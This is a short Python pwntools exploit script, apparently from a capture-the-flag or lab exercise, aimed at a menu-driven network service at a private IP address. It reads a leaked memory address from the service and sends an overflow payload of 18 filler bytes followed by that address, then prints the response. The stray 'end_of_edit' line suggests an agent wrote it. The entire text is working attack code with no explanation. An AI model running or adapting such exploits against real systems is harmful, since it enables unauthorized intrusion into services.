from pwn import *

context.log_level = 'error'
r = remote("172.19.0.82", 8000)
data = r.recvuntil(b"5) Exit")
leak = int(data.split(b"0x")[1].split(b"\n")[0], 16)
print("LEAK:", hex(leak))
r.sendline(b"1")
r.recv(timeout=1)
r.sendline(b"16")
r.recvuntil(b"5) Exit\n")
r.sendline(b"3")
r.recv(timeout=1)
payload = b"A"*18 + p64(leak)
r.sendline(payload)
r.recvuntil(b"5) Exit\n")
r.sendline(b"4")
data = r.recvuntil(b"5) Exit\n", timeout=2)
print("PRINT:", repr(data[:80]))
r.close()
end_of_edit

